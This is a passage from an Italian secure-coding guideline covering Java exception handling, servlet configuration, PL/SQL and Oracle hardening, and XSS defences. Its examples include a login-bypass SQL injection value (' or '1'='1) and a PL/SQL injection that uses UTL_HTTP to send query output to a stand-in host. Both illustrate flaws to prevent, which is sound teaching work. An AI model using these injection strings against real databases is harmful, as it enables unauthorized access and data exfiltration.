// a meno che il codice non sia stato dotato del se guente permesso 
// RuntimePermission("defineClassInPackage."+packag e) 
[...] 
package.definition=Pacchetto1 [,Paccchetto2,...,Pac chetton] 
[...] 
 
È anche possibile inserire le classi del pacchetto in un file jar. In questo modo nessun codice può ot tenere il 
permesso ad ampliare il pacchetto e non c’è quindi motivo di modificare il file java.security properti es.  
È necessario proteggere l’accesso. Ciò può essere f atto inserendo la seguente linea nel file java.secu rity 
properties: 
[...]  
package.access=Pacchetto 1 [,Pacchetto 2,...,Pacche tto n] 
[...] 
Ciò causerà un’eccezione nel loader loadClass non a ppena si proverà ad accedere ad una classe 
all’interno del pacchetto, a meno che il codice non  sia stato dotato del seguente permesso: 
[...] 
RuntimePermission("accessClassInPackage."+package) 
[...] 
7.2.10.12  Gestione delle eccezioni 
Tutti i null pointer devono essere gestiti, di modo  che il programma sia robusto e non dia origine a “ stack 
trace” incontrollati . La forma corretta nell’esemp io che segue, mostra come utilizzare le capacità di  logging 
di Java per mantenere traccia delle eccezioni. 
 
 
 
Linee guida per lo sviluppo sicuro Pag. 74  a 156  
 
Esempio : 
Forma non corretta 
import java.io.*; 
import java.util.*; 
public class BadEmptyCatch { 
  List quarks = new ArrayList(); 
  quarks.add("hello word"); 
  FileOutputStream file = null; 
  ObjectOutputStream output = null; 
  try{ 
   file = new  FileOutputStream("quarks.ser"); 
output =new ObjectOutputStream(file); 
   output.writeObject(quarks); 
  } 
  catch(Exception exception){System.err.println(exc eption); 
  } 
  finally{ 
    try { 
    if (output != null) { 
     output.close(); 
    } 
   } 
   catch(Exception exception){ 
    } 
  } 
 
Forma corretta: 
import java.io.*; 
import java.util.*; 
import java.util.logging.*; 
 
public class ExerciseSerializable { 
 
 public static void main(String args) { 
  List quarks = new ArrayList(); 
  quarks.add("hello word"); 
  ObjectOutput output = null; 
  try{ 
   OutputStream file = new FileOutputStream( "quark s.ser"); 
   OutputStream buffer = new BufferedOutputStream( file ); 
output =  
new ObjectOutputStream(buffer);  output.writeObject (quarks); 
  } 
  catch(IOException ex){ 
   fLogger.log(Level.SEVERE, "Cannot perform output .", ex); 
  } 
  finally{ 
   try { 
    if (output != null) { 
     output.close(); 
    } 
   } 
   catch (IOException ex ){ 
    fLogger.log(Level.SEVERE, "Cannot close output stream.", ex); 
   } 
  } 
 
O si specifica la clausola throws e si rinvia quind i la cattura dell’errore alla classe chiamante, opp ure lo si 
gestisce localmente. In questo caso bisogna evitare  di raggruppare le eccezioni in un blocco di eccezi oni 
generico, in quanto ciò rappresenterebbe una perdit a di informazioni importanti.  
 
Esempio: 
Forma non corretta 
import java.io.*; 
 
 
Linee guida per lo sviluppo sicuro Pag. 75  a 156  
 
import java.util.*; 
public class BadGenericThrow { 
 public void makeFile() throws Exception { 
  //create a Serializable List 
  List<String> quarks = new ArrayList<String>(); 
  quarks.add("hello word"); 
  FileOutputStream file = null; 
  ObjectOutputStream output = null; 
  try{ 
   file = new FileOutputStream("quarks.ser"); 
   output = new ObjectOutputStream(file); 
output.writeObject(quarks); 
  } 
  finally{ 
   if (output != null) { 
    output.close(); 
   } 
  } 
 } 
}  
 
Forma corretta 
import java.io.*; 
import java.util.*; 
 
public class BadGenericThrow { 
 public void makeFile() throws  IOException, FileNo tFoundException{ 
  //create a Serializable List 
  List<String> quarks = new     ArrayList<String>() ; 
  quarks.add("hello word"); 
  FileOutputStream file = null; 
  ObjectOutputStream output = null; 
  try{ 
   file = new FileOutputStream("quarks.ser"); 
   output = new ObjectOutputStream(file); 
output.writeObject(quarks); 
  } 
  finally{ 
   if (output != null) { 
    output.close(); 
   } 
  } 
 } 
} 
7.2.10.13  Java Servlet 
I dati dei moduli (form) html dovrebbero viaggiare preferibilmente attraverso richieste di tipo http P OST, 
per cui il metodo doGet dovrebbe solo contenere la gestione dell’errore sollevato se viene invocato il  
metodo GET. La ragione per preferire il metodo POST  sta nel fatto che in questo caso i parametri non 
viaggiano sull’url e non vengono pertanto memorizza ti nei file di log o nella cache del browser. 
Chiaramente POST è ugualmente manipolabile, ma con maggior difficoltà. 
Per implementare in maniera flessibile la sicurezza  delle servlet si può agire attraverso la configura zione 
web.xml, oppure è possibile utilizzarel’annotazione  @ServletSecurity con le annotazioni ausiliarie 
@HttpMethodConstraint e @HttpConstraint. 
 
Nell’esempio seguente la servlet viene resa sicura attraverso la configurazione del file web.xml: 
<?xml version="1.0" encoding="UTF-8"?> 
<web-app xmlns="http://java.sun.com/xml/ns/javaee" [...] version="3.0"> 
  <display-name>Esempio Servlet Sicurezza</display- name> 
 
  <servlet> 
    <servlet-name>servletSicurezza</servlet-name> 
    <servlet-class>com.package.servlet.servletSicur ezza</servlet-class> 
  </servlet> 
 
 
Linee guida per lo sviluppo sicuro Pag. 76  a 156  
 
 
  <servlet-mapping> 
    <servlet-name>servletSicurezza</servlet-name> 
    <url-pattern>/</url-pattern> 
  </servlet-mapping> 
 
  <security-constraint> 
    <web-resource-collection> 
      <web-resource-name>secure</web-resource-name>  
      <url-pattern>/</url-pattern> 
      <http-method>GET</http-method> 
    </web-resource-collection> 
    <auth-constraint> 
      <role-name>dipendente</role-name> 
    </auth-constraint> 
  </security-constraint> 
 
  <login-config> 
    <auth-method>BASIC</auth-method> 
    <realm-name>default</realm-name> 
  </login-config> 
 
</web-app> 
Si impone l’autenticazione base, per il metodo GET.  Solo gli utenti appartenenti al ruolo “dipendente”  
possono accedere. 
La stessa cosa può essere ottenuta attraverso l’ann otazione @ServletSecurity. 
Esempi:  
Il seguente codice impone l’uso della crittografia in tutte le connessioni GET  
@ServletSecurity(@HttpConstraint(transportGuarantee  =                 
TransportGuarantee.CONFIDENTIAL)) 
 
La dichiarazione seguente, invece, nega le connessi oni con il metodo GET. POST invece è ammesso: 
@ServletSecurity( 
    httpMethodConstraints = @HttpMethodConstraint(v alue = "GET", 
                        emptyRoleSemantic = EmptyRo leSemantic.DENY) 
) 
Con la seguente affermazione si permette l’acceso s olo a utentti del ruolo “admin”: 
@ServletSecurity(@HttpConstraint(rolesAllowed = "ad min")) 
 
I valori presenti come parametri nella request devo no essere validati prima di poter essere utilizzati  
dall’applicazione. URL, Cookies, Form Fields, Hidde n Fields, Headers, etc. ottenuti dai metodi 
getParameter(), getCookie(), o getHeader() degli og getti HttpServletReques), prima di essere utilizzat i, 
devono essere rigorosamente validate server-side. 
Ciascun parametro in input deve specificare : 
• il tipo di dato (string, integer, real, etc.); 
• il set di caratteri consentito; 
• la lunghezza minima e massima; 
• la possibilità di accettare il valore NULL; 
• la possibilità che il parametro sia richiesto o men o; 
• la possibilità che siano  permessi i duplicati; 
• intervallo numerico; 
• i valori ammessi (numerazione) ; 
• i pattern (espressioni regolari) ; 
Per ciascun parametro occorre inoltre filtrare qual siasi carattere speciale e sostituirlo con il corri spondente 
carattere HTML. Queste routine di controllo devono essere sempre eseguite all’interno dei metodi doGet () 
e doPost() di tutte le Servlet che compongono la We b Application.  
La tabella seguente mostra un’esemplificazione dei caratteri speciali che devono essere ricercati e le  
corrispondenti sostituzioni HTML che devono essere effettuate.  
 
 
 
Linee guida per lo sviluppo sicuro Pag. 77  a 156  
 
Carattere speciale da 
ricercare:  
 Car attere HTML sostitutivo:  
 
< &lt;  
> &gt;  
( &40;  
) &41;  
# &35;  
& &38;  
Un metodo spesso adottato per effettuare queste ope razioni di filtro e controllo consiste nell’adozion e di 
un Web Application Firewall (WAF). Questi reverse p roxies ricevono il traffico dai client, e dopo oppo rtune 
modifiche, lo passano alla parte di back-end, sul s erver. 
 
Anche per le servlet esiste la possibilità di una S QL injection. Un Web Application Firewall è una dif esa 
contro le injection in generale, ma se una servlet accede ad un database, è opportuno che  i relativi 
statements SQL non siano mai costruiti utilizzando concatenazioni di stringhe soprattutto se tali 
informazioni sono inserite dagli utenti. Invece del la concatenazione dinamica di stringhe, occorre uti lizzare 
l’interfaccia PreparedStatement che, tramite il dri ver JDBC, effettua la canonicalizzazione dei parame tri in 
modo automatico. Di seguito un esempio di utilizzo dell’interfaccia PreparedStatement. 
Esempio: 
. . . 
String selectStatement = "SELECT * FROM User WHERE userId = ? "; 
PreparedStatement prepStmt = con.prepareStatement(s electStatement); 
prepStmt.setString(1, userId); 
ResultSet rs = prepStmt.executeQuery(); 
. . . 
Per quanto riguarda il controllo delle sessioni, bi sogna evitare di creare token di sessione ad-hoc ed  
utilizzare preferibilmente quelli messi a disposizi one del web container (o web application server) in  uso, 
gestendo le sessioni utente tramite l’apposita inte rfaccia javax.servlet.http.HttpSession. In qualsias i caso i 
token di sessione dovrebbero sempre rispettare le s eguenti regole: 
• non devono mai essere inclusi nelle URL; 
• devono essere costituiti da lunghe e complicate cat ene di numeri randomici che non possano 
essere facilmente indovinati; 
• dovrebbero cambiare di frequente durante una sessio ne; 
• dovrebbero cambiare quando si passa ad utilizzare p rotocolli come SSL; 
• non devono mai essere utilizzati token scelti da un  utente. 
Se per memorizzare le sessioni si utilizzano i cook ies, si devono sempre rispettare le seguenti regole  
minime: 
• i cookies non devono essere mai utilizzati per memo rizzare dati personali o informazioni sensibili 
(es: login, password, fede religiosa, malattie, etc .); 
• prima di trasferire informazioni personali o sensib ili verso un utente è necessario richiedere sempre 
la sua autenticazione e autorizzazione tramite inse rimento di login e password: non basarsi mai 
sulla presenza o meno di un cookie precedentemente memorizzato; 
• configurare i session cookies in modo tale che scad ano quando l’utente esce dal browser; 
• assicurarsi che tutte le informazioni contenute nei  cookies siano accuratamente verificate e filtrate 
prima di essere utilizzate e/o inserite nei documen ti HTML. 
Altra norma che agevola la sicurezza consiste nel l imitare la dimensione delle risposte http. Ove poss ible 
limitare sempre la lunghezza delle risposte HTTP al  minimo necessario, troncando quelle che hanno una 
dimensione eccedente. 
C’è anche una buona prassi che riguarda l’HTTP Refe rer. Ove possible, verificare sempre il campo Refer er 
dell’header HTTP (es. metodo getHeader(java.lang.St ring name) dell’interfaccia 
 
 
Linee guida per lo sviluppo sicuro Pag. 78  a 156  
 
javax.servlet.http.HttpServletRequest) e rigettare le informazioni provenienti da host o link incorret ti e/o 
inaspettati. 
Trattamento dei files e degli oggetti embedded. Una  servlet non deve mai accettare in input contenuti 
sottomessi da un utente che contengano tag HTML, ti pici dell’iclusione di file od oggetti come: <EMBED >, 
<OBJECT> e <SCRIPT>. 
 
Come già evidenziato altrove, tutte le eccezioni ch e si verificano durante l’esecuzione delle servlet che 
costituiscono l’applicazione web devono essere catt urate e gestite opportunamente. I relativi mesaggi di 
errore sollevati (es. dump di databse o codici di e rrore - out of memory, null pointer exceptions, sys tem call 
failure, database unavailable, network timeout), de vono essere visualizzati verso l’utenza in accordo ad uno 
schema ben dettagliato: agli utenti generici devono  essere inviate le informazioni minime in grado di 
aiutarli nella comprensione degli errori stessi (se nza rivelare dettagli superflui), mentre le informa zioni sulla 
diagnostica devono essere inviate per la visualizza zione esclusivamente agli amministratori 
dell’applicazione. Il meccanismo di gestione errori  deve essere in grado di gestire ogni tipo di dati in 
ingresso e di garantire la sicurezza. Devono essere  previsti dei messaggi di errore semplici, in grado  di 
indicare la causa. I tentativi d’intrusione devono essere registrati nei file di log, qualunque ne sia  l’esito, in 
modo tale da poterli verificare in un secondo tempo . La gestione degli errori non deve essere concentr ata 
soltanto sui dati forniti in ingresso dall’utente, ma deve includere anche tutti gli errori che posson o essere 
generati da componenti interni come system call, qu ery sul db o altre funzioni interne. 
Anche il risparmio delle risorse macchina una buona  prassi. Ove possibile,implementare meccanismi che 
consentono di limitare al massimo il numero di riso rse allocate per ogni singolo utente. Per gli utent i 
auntenticati, è possibile fissare una quota in modo  da poter limitare il carico massimo che un utente può 
applicare al sistema. Per gli utenti non autenticat i, si dovrebbero evitare tutti gli accessi che comp ortino 
query e la possibilità di utilizzare altre applicaz ioni avide di risorse ritenute superflue, mantenend o ad 
esempio in una cache il contenuto dei dati ricevuti  da questi utenti invece di eseguire delle nuove qu ery sul 
DataBase. 
7.3  PL/SQL 
PL/SQL (Programming Language / Structured Query Lan guage) è un linguaggio di programmazione che 
viene implementato su un Oracle RDBMS. PL/SQL è in grado di utilizzare gli oggetti messi a disposzione  dal 
RDBMS Oracle, poiché è stato realizzato “su misura”  per tali oggetti. 
I maggiori database relazionali di altri produttori  includono linguaggi di programmazione simili a PL/ SQL di 
Oracle, anch’essi in grado di utilizzare le specifi cità degli oggetti a loro disposizione per incremen tare la 
produttività e creare processi elaborativi automati zzati efficienti. Sybase e Microsoft SQL Server uti lizzano 
Transact-SQL, IBM DB2 utilizza SQL procedural Langu age, PostgreSQL supporta PL/pgSQL, ecc.  
7.3.1  Cross-site scripting (XSS) 
Come riconoscerla 
Il Cross Site Scripting consiste nella possibilità di inoculare uno script e di mandarlo in esecuzione  sul front-
end dell’applicazione. Tramite tecniche sviluppate da malintenzionati per ottenere informazioni person ali, 
possono, ad esempio, essere simulate pagine quasi i dentiche ad altri siti molto frequentati per ottene re 
informazioni riservate. La prassi del “social engin eering” consente di ingannare gli utenti per indurl i a 
visitare pagine fraudolente. Gli attacchi XSS di ti po reflected si verificano ogni qualvolta uno scrip t viene 
inoculato ed eseguito nel periodo in cui dura la se ssione. Gli XSS stored, viceversa, sono script male voli che 
sono stati memorizzati su una base dati e vengono p ertanto incorporati nella pagina ( e quindi eseguit i) 
ogni volta che qualcuno ne fa richiesta. 
Siamo di fronte ad DOM based XSS se i dati malevoli , contenenti tag HTML e script, vengono incorporati  
direttamente nell'HTML della pagina, in modo che il  browser visualizzerà queste informazioni come part e 
della pagina web eseguendo in maniera silente gli s cript. Chi visualizza la pagina modificata in modo 
fraudolento non sarà in grado di riconoscere l’inga nno. 
 
 
Linee guida per lo sviluppo sicuro Pag. 79  a 156  
 
Come difendersi 
Per prima cosa è necessatio convalidare tutti gli i nput, indipendentemente dalla fonte: la convalidazi one 
dovrebbe essere basata su una white list (una lista  di valori ammessi), per cui verrebbero accettati s olo i 
dati compresi e rifiutati tutti gli altri. 
Occorre controllare, oltre che i valori siano fra q uelli ammessi o che rientrino in un determinato int ervallo 
di validità, se corrispondano alle attese anche il tipo, la dimensione e il formato dei dati in input.  
Un altro accorgimento consiste nell’encoding (codif ica) di tutti i dati dinamici, cioè nella neutraliz zazione 
dei caratteri pericolosi, in modo da rendere inatti vi eventuali inserimenti malevoli. La codifica dovr ebbe 
essere sensibile al contesto, in base al tipo di da to che si vuole neutralizzare: se ci si aspetta che  possa 
esserci codice HTML abusivo, occorre codificare gli  eventuali tag HTML, se ci si potrebbe trovare di f ronte a 
uno script, allora bisogna codificare gli elementi sintattici di Javascript, ecc. 
Si consiglia di utilizzare la libreria di codifica ESAPI o le funzioni di libreria sistema incorporate . 
Nell'intestazione di risposta Content-Type HTTP, de finire esplicitamente la codifica dei caratteri (ch arset) 
per l'intera pagina 
Impostare la flag httpOnly sul cookie della session e, per impedire che eventuali attacchi XSS possano 
manometterlo. 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/79.html  
CWE-79: Improper Neutralization of Input During Web  Page Generation ('Cross-site Scripting') 
 
7.3.2  Resource Injection 
Come riconoscerla  
L'applicazione apre un socket di rete, per l'ascolt o delle connessioni in entrata, utilizzando dati no n 
attendibili. In questo modo si consente a un utente  malintenzionato di controllarlo. 
L’attaccante potrebbe perciò essere in grado di apr ire una backdoor che gli consenta di connettersi 
direttamente al server delle applicazioni, acquisen do il controllo del server o esponendolo ad altri a ttacchi 
indiretti. In particolare, modificando il numero di  porta del socket, potrebbe essere in grado di aggi rare 
controlli di rete deboli, mascherando l'attacco da parte di altri dispositivi di rete. 
Una resource injection può essere sfruttata anche p er bypassare i firewall o altri meccanismi di contr ollo 
degli accessi. Si può anche utilizzare l'applicazio ne come proxy per la scansione delle porte delle re ti interne 
e per l'accesso diretto ai sistemi locali; oppure p er indurre un utente a inviare informazioni riserva te a un 
server fraudolento. 
Come difendersi 
Non consentire a un utente di definire i parametri relativi ai sockets di rete. 
Questo esempio in PLSQL prende un path di tipo URL da una CGI ed esegue il download del file contenuto . 
La vulnerabilità è rappresentata dalla possibilità per un utente malintenzionato di modificare il path  o il 
nome del file, ricevendo dal server del contenuto a rbitrario e potenzialmente dannoso. 
Esempio: 
filename := SUBSTR(OWA_UTIL.get_cgi_env('PATH_INFÒ) , 2); 
WPG_DOCLOAD.download_file(filename); 
 
Per ulteriori informazioni si veda:  http://cwe.mitre.org/data/definitions/99.html, 
CWE-99: Improper Control of Resource Identifiers (' Resource Injection'). 
7.3.3  SQL Injection 
Come riconoscerla  
 
 
Linee guida per lo sviluppo sicuro Pag. 80  a 156  
 
SQL Injection è una tecnica che consente a un attac cante di inserire comandi SQL arbitrari nelle query  
eseguite da un'applicazione Web sul proprio databas e. Può funzionare su pagine Web e app vulnerabili c he 
utilizzano un database relazionale. 
Un attacco riuscito può comportare l'accesso non au torizzato a informazioni riservate nel database o l a 
modifica di dati. In alcuni casi, una SQL Injection  riuscita può arrestare o addirittura eliminare l'i ntero 
database. 
Come difendersi 
Come prima misura, occorre validare l’input, sottop onendolo a rigidi controlli, come già illustrato ne i punti 
precedenti. 
Le query SQL non devono mai essere realizzate conca tenando stringhe con l’input esterno. Bisogna invec e 
utilizzare componenti di database sicuri come le st ored procedure (stored procedures), query 
parametrizzate alle quali si associano i valori in input. 
Una soluzione che può essere d’aiuto consiste nell’ utilizzazione di una libreria ORM, come 
EntityFramework, Hibernate o iBatis. 
Occorre limitare l'accesso agli oggetti e alle funz ionalità del database, in base al "Principle of Lea st 
Privilege" (non fornire agli utenti permessi superi ori a quelli strettamente necessari).  
Esempio: 
Consideriamo la seguente query: 
SELECT * FROM Tabella WHERE username='$user' AND pa ssword='$pass' 
$user e $pass sono impostate dall'utente e supponia mo che nessun controllo su di esse venga fatto. 
Vediamo cosa succede inserendo i seguenti valori: 
$user = ' or '1' = '1 
$pass = ' or '1' = '1 
La query risultante sarà: 
SELECT * FROM Tabella WHERE username='' or '1' = '1 ' AND password='' or '1' = '1' 
 
Nell'approccio white list viene proposto un insieme  di caratteri validi. Ad ogni richiesta, se l'input  ricevuto 
contiene dei caratteri non presenti in tale lista, allora segnaleremo un errore. Ciò comporta un’atten ta 
definizione della lista in fase di definizione dei requisiti dell'applicazione, oltre che una corretta  gestione dei 
caratteri. 
Oltre la white list, si può anche usare il metodo d ella concatenazione delle variabili con uso della 
funzionalità “quote”. 
 
Esempio: 
Forma non corretta: 
SQLExec("SELECT NAME, PHONE FROM PS_INFO WHERE NAME ='" | &UserInput | "'", &Name, 
&Phone); 
 
Forma corretta 
SQLExec("SELECT NAME, PHONE FROM PS_INFO WHERE NAME ='" |  
Quote(&UserInput) | "'", &Name, &Phone); 
 
Per ulteriori informazioni si veda:  http://cwe.mitre.org/data/definitions/89.html  CWE-89, 
Improper Neutralization of Special Elements used in  an SQL Command ('SQL Injection') 
7.3.4  Ulteriori indicazioni per lo sviluppo sicuro 
Di seguito vengono descritte ulteriori direttive pe r lo sviluppo PL/SQL in sicurezza. 
7.3.4.1  Posizionamento delle procedure PL/SQL 
È  necessario valutare attentamente la posizione in  cui si collocano le procedure sviluppate: 
• In file separati, organizzati per categoria, sul fi lesystem del db server: 
• Minor numero di vulnerabilità derivanti dal fatto c he il codice non viene precaricato 
• Implementazione di meccaniche di “failover” più sem plice 
 
 
Linee guida per lo sviluppo sicuro Pag. 81  a 156  
 
• Possibilità dell’uso del version-control e backup 
• Maggiore protezione del codice sorgente, difficile da sovrascrivere 
• Nei packages del DB: 
• Maggior efficenza del codice 
• Accesso al codice tramite la tabella USER_SOURCE 
• Integrazione con alcuni IDE 
7.3.4.2  Tipologie di procedure vulnerabili 
L’utilizzo di differenti strumenti di manipolazione  dei dati che il PL/SQL mette a disposizione degli 
sviluppatori, determina la modalità con cui il codi ce viene scritto, ed in ultima istanza determina la  tipologia 
di risorsa che il codice andrà a comporre. Esistono  in PL/SQL i seguenti tipi di “risorse”: 
• embedded SQL 
• cursori (ovvero i recordset del PL/SQL) 
• EXECUTE IMMEDIATE (ovvero PL/SQL dinamico) 
• Packages 
• Triggers 
Per tutte queste differenti tipologie di risorse, c omunque, la casistica in cui il PL/SQL risulta vuln erabile può 
essere ridotta a due tipologie di codice: 
• Blocco di PL/SQL anonimo, ovvero un blocco di codic e racchiuso da BEGIN ed END, utilizzato per 
eseguire query multiple.  
Esempio: 
EXECUTE IMMEDIATE  
‘BEGIN INSERT INTO TABELLA (COLONNA1) VALUES (‘’’ | | PARAM || ‘’’);  
END;’; 
• Blocco di PL/SQLa singola riga, ovvero quel codice che non è dichiarato con BEGIN ed END, e non 
permette l’utilizzo del carattere “;” per l’iniezio ne di query multiple. 
Esempio: 
OPEN cur_cust FOR ‘select name from customers where  id = ‘’’|| p_idtofind || 
‘’’’; 
7.3.4.3  Filtraggio dei tipi di input iniettabile 
Quando si utilizzano le stored procedures, è necess ario porre opportuna attenzione al filtro dei segue nti tipi 
di input: 
• UNIONI: possono essere utilizzate per includere que ry ulteriori rispetto a quelle effettuate dalla 
stored procedure. 
• SUBSELECTS 
• Comandi DDL/DML (INSERT, UPDATE, DELETE etc.) 
• Nomi dei packages 
7.3.4.4  Filtro dei caratteri potenzialmente dannosi 
• È necessario che i caratteri “ (ASCII 34), ‘ (ASCII  39), in tutte le loro possibili codifiche (hex, as cii, utf-
8, etc.), siano filtrati e/o opportunamente sanitiz zati mediante escaping. 
• È inoltre necessario che i caratteri # (ASCII 35), -- (ASCII 4545), % (ASCII 37), ; (ASCII 59), in tut te le 
loro possibili codifiche (hex, ascii, utf-8, etc.) siano filtrati e/o opportunamente sanitizzati media nte 
escaping. 
7.3.4.5  Direttive per Oracle 
Si elencano di seguito le direttive di configurazio ne del database Oracle alle quali è necessario atte nersi – 
nei limiti posti dalle esigenze applicative – per r aggiungere un elevato livello di sicurezza delle ap plicazioni 
sviluppate con questa tecnologia. Si tratta di azio ni che devono essere eseguite per garantire una cer ta 
sicurezza. 
Account : 
 
 
Linee guida per lo sviluppo sicuro Pag. 82  a 156  
 
• cambiare la password all’utente SYS; 
• disabilitare gli account di default del database; 
Ruoli :  
• revocare il ruolo RESOURCE dagli utenti; 
• revocare il ruolo CONNECT da tutti gli utenti; 
Permessi :  
• revocare il permesso pubblico di esecuzione su utl_ file (vedi par. “prevenire l’upload remoto di 
file”) ; 
• revocare il permesso pubblico di esecuzione su utl_ http (vedi par. “prevenire la redirezione 
dell’output”) ; 
• revocare il permesso pubblico di esecuzione su utl_ tcp ; 
• revocare il permesso pubblico di esecuzione su utl_ smtp ;  
• controllare il permesso pubblico di esecuzione sui packages e le viste di cui gli utenti sys e dba son o 
proprietari; 
• revocare il permesso pubblico su dbms_random; 
• revocare il permesso pubblico su dbms_lob ; 
• revocare ogni tipo di permesso su dbms_sql e dbms_s ys_sql granted; 
• utilizzare i permessi dell'utente chiamante per ogn i tipo di procedura; 
• controllare e opportunamente dispensare il permesso  "BECOME USER"; 
• controllare e opportunamente dispensare il permesso  "CREATE ANY DIRECTORY"; 
• controllare e opportunamente dispensare il permesso  "CREATE JOB"; 
• controllare e opportunamente dispensare il permesso  “CREATE LIBRARY” ; 
• revocare ogni permesso di esecuzione su sys.initjvm aux; 
• revocare il permesso pubblico di esecuzione su dbms _job; 
• revocare il permesso pubblico di esecuzione su dbms _scheduler ; 
• revocare il permesso pubblico di esecuzione su owa_ util; 
• negare l'accesso all'esecuzione di "SELECT ANY TABL E"; 
• controllare ed opportunamente disporre i permessi d i accesso al package dbms_backup_restore; 
• revocare il permesso di creazione degli oggetti a t utti gli utenti eccetto quelli proprietari dello 
schema; 
• controllare l'accesso agli oggetti ed assicurarsi c he gli utenti possano interagire unicamente con gli  
oggetti che sono loro necessari; 
• impedire al dba di leggere le tabelle di sistema; 
• impedire al dba di leggere i dati dell'applicazione . 
Inoltre: 
• controllare ed opportunamente sanitizzare il parame tro utl_file_dir;  
• controllare l'accesso di Java al sistema operativo;   
• controllare e regolare opportunamente la maniera in  cui Java e Oracle interagiscono; 
• rendere extproc sicuro; 
• settare il parametro _trace_files_public a FALSE ; 
• controllare e rendere sicuro il package statspack. 
 
Altre misure per proteggere il codice PL/SQL consis tono nei seguenti punti: 
• Offuscamento del codice con WRAP: l’utility “wrap” (utilizzabile nella forma: wrap iname=input_file 
[oname=output_file]), deve essere utilizzato per of fuscare i files SQL ove le procedure sono 
memorizzate. È necessario ricordare che l’utility w rap è in grado di offuscare il codice rendendo di 
difficile lettura il sorgente (e quindi l’algoritmo ), ma non è in grado di proteggere eventuali string he 
di testo memorizzate staticamente nel codice, come nomi di tabelle e passwords. 
• Prevenire la redirezione dell’output; è sempre nece ssario filtrare l’accesso al package UTL_HTTP 
che può essere utilizzato per la redirezione dell’o utput nelle query.  
 
 
Linee guida per lo sviluppo sicuro Pag. 83  a 156  
 
Esempio:  
Forma non corretta: 
SELECT TRANSLATE(‘input utentè, ‘0123456789ABCDEFGH IJKLMNOPQRSTUVWXYZ’, 
‘0123456789’)  
FROM DUAL;  
Valorizzando l’input utente come: 
 ‘’ || UTL_HTTP.REQUEST(‘http://10.0.0.1/ricevi.php’ ) || ‘’ 
La procedura diventa: 
SELECT TRANSLATE(‘’ || UTL_HTTP.REQUEST(‘http://10. 0.0.1/ricevi.php’) || ‘’, 
‘0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ’,  ‘012345678 9’)  
FROM DUAL; 
• Prevenire l'upload remoto di file. È sempre necessa rio filtrare l'accesso al package UTL_FILE che 
può essere il trasferimento di file tramite stored procedures. 
• Prevenire l'injection di chiamata a funzioni. È sem pre necessario limitare opportunamente il 
contesto di transazione di una procedura. È inoltre  necessario evitare di utilizzare la direttiva 
PRAGMA AUTONOMOUS_TRANSACTION ove non necessario, o nde evitare di modificare il contesto 
transazionale all'interno del quale la query viene eseguita. 
• Dichiarazione dei privilegi di esecuzione delle pro cedure. È necessario: 
• dichiarare le procedure utilizzando la keyword AUTH ID CURRENT_USER;  
• revocare il privilegio EXECUTE sui pacchetti e sull e procedure standard di Oracle non utilizzati; 
• garantire i permessi alle operazioni di creazione ( CREATE) e modifica (ALTER) di procedure 
unicamente ad utenze "trusted"; 
• definire i permessi delle funzioni associandoli uni camente ad utenti "trusted"; 
• garantire il ruolo RESOURCE unicamente ad utenti "t rusted”. 
 
7.4  Javascript 
 
JavaScript è un linguaggio di programmazione interp retato, con tipizzazione debole e dinamica. Insieme  con 
HTML e CSS, costituisce la tecnologia di base per r ealizzare pagine web. Negli ultimi anni Javascript ha 
assunto un’importanza molto accentuata, grazie alla  diffusione di innumerevoli framework che ne 
estendono e semplificano l’uso. Nuove versioni hann o fatto di Javascript un linguaggio moderno, flessi bile e 
potente. Nato come linguaggio lato client, interpre tato esclusivamente dal browser, Javascript è oggi anche 
diffuso come componente server-side supportato da R DBMS e web server. 
7.4.1  Cross Site Scripting (XSS) 
Come riconoscerla 
Il problema principale veicolato da Javascript è il  Cross Site Scripting (XSS), che si attua inoculand o, 
attraverso un canale di input non controllato né ve rificato, uno script malevolo. 
Il canale attraverso il quale l’input fraudolento p uò entrare può essere il campo di un modulo o un 
parametro passato attraverso l’url di una request G ET, o nel corpo di una request POST. 
Uno script malevolo può inviare all’esterno infroma zioni sulla sessione, leggere i cookie, dati person ali e 
altre informazioni riservate; può anche modificare la pagina attraverso la manipolazione del DOM (Doma in 
Object Model) dell’HTML. Da questo punto in poi, l’ utente può essere tratto in inganno in molti modi: 
potrebbe essere indotto a inserire dati personali i n una finta verifica o può essere dirottato su pagi ne fake 
che ne carpiscano la fiducia. 
Il Cross Site Scripting può essere reflected o stor ed. Nel primo caso, uno script inoculato è valido s olo 
all’interno della sessione corrente, ma i suoi effe tti possono essere molto dannosi per il sito vittim a 
dell’attacco. 
Ancora più grave è il Cross Site Scripting di tipo stored. In questo caso lo script inoculato viene me morizzato 
come parte intregrante della pagina all’interno di un database e rispristinato ogni qual volta la pagi na in 
 
 
Linee guida per lo sviluppo sicuro Pag. 84  a 156  
 
questione viene caricata. Quest’attacco è stato sfr uttato ampiamente nel recente passato, soprattutto 
laddove veniva consentito agli utenti di inserire r ecensioni, commenti e altri contributi. 
Volendo schematizzare, possiamo categorizzare gli a ttacchi XSS nelle seguenti tipologie: 
• Reflected XSS, in cui la stringa dannosa proviene d alla richiesta dell’utente. 
• Stored XSS, in cui la stringa dannosa proviene dal database del sito Web. 
• DOM based XSS, in cui la vulnerabilità è nel codice  lato client anziché nel codice lato server. 
Poiché Javascript è molto potente e flessibile, un sito sotto attacco mette in pericolo le proprie inf ormazioni 
e quelle degli utenti che vi si collegano.  
I danni del Cross Site Scripting possono essere ese mplificati schematicamente come segue: 
Furto di cookie 
L'aggressore può accedere ai cookie associati al si to Web bersaglio, inviarli al proprio server e util izzarli per 
estrarre informazioni riservate come gli ID di sess ione. 
Keylogging 
L'aggressore può registrare un listener che registr i tutti gli di eventi provenienti dalla tastiera e quindi 
inviare tutte le sequenze di tasti dell'utente al p roprio server. In tal modo può entrare in possesso di 
informazioni potenzialmente sensibili come password  e numeri di carta di credito. 
Phishing 
Utilizzando la manipolazione DOM , l'autore dell'at tacco può far comparire sulla pagina un modulo di 
accesso falso e indurre l'utente a inviare informaz ioni riservate al proprio server. 
 
Come difendersi 
Le seguenti contromisure sono efficaci per evitare che gli attacchi XSS riescano nel loro intento: 
• Encoding (codifica), che opera l’escaping all'input  dell'utente in modo che il browser lo interpreti 
solo come testo, non come codice. Si tratta di filt rare i caratteri specifici dei tag HTML e della 
codifica Javascript, sostituendoli con del testo. 
• Validation (convalida), che controlla nel merito l' input dell'utente, valutando che risponda a 
determinati criteri attesi. 
• CSP. Oltre a questi rimedi, è necessario attivare l o standard Content Security Policy (CSP) in modo 
che solo le risorse scaricate da fonti attendibili possano essere utilizzate. Per risorsa s’intende qu i 
